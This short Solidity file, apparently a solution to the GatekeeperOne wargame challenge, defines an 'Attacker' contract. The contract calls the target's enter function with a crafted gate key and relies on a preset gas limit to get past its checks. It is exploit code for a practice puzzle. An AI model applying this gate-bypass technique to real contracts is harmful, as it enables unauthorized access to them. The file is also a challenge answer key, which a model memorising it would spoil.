// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Gas limit needs to be set to 2999393

interface GatekeeperOne{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    GatekeeperOne public target;
    address payable public owner;
    bytes8 public gateKey ;

    constructor(address _to_call) {
        target = GatekeeperOne(_to_call);
        owner = payable(msg.sender);
        gateKey = 0x111111110000AA1E;
    }

    function empty() public
    {
        target.enter(gateKey);
    }
}
